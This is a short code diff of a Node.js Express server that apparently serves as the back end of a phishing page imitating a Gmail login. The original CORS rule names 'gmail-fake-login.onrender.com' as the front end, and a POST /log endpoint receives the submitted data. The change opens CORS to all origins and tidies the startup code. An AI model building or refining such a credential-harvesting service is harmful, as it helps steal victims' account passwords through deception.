@@ -1,12 +1,10 @@
 const express = require('express');
 const fs = require('fs');
-const cors = require('cors'); // Add this line
+const cors = require('cors'); // Make sure this is here
 const app = express();
 
-// Allow requests from your frontend
-app.use(cors({
-    origin: 'https://gmail-fake-login.onrender.com' // Your frontend URL
-}));
+// Allow all origins (we’ll change this later)
+app.use(cors());
 
 app.use(express.json());
 
@@ -23,8 +21,6 @@ app.post('/log', function(req, res) {
     res.send('Done');
 });
 
-// Use the port Render provides, or default to 3000 for local testing
-const port = process.env.PORT || 3000;
-app.listen(port, '0.0.0.0', function() {
-    console.log("Server started on port " + port);
+app.listen(process.env.PORT || 3000, function() {
+    console.log("Server started!");
 });
